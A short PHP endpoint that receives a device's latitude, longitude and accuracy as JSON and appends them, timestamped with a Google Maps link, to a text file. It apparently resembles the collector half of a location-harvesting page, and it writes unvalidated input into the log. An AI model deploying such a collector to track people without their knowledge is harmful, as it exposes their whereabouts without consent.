<?php
date_default_timezone_set("Asia/Jakarta");

$data = json_decode(file_get_contents("php://input"), true);

if (!$data) {
    http_response_code(400);
    exit;
}

$lat = $data["latitude"];
$lon = $data["longitude"];
$acc = $data["accuracy"];
$time = date("Y-m-d H:i:s");

$line = "[$time] LAT: $lat | LON: $lon | ACC: {$acc}m | MAP: https://maps.google.com/?q=$lat,$lon\n";

file_put_contents("data.txt", $line, FILE_APPEND | LOCK_EX);
?>
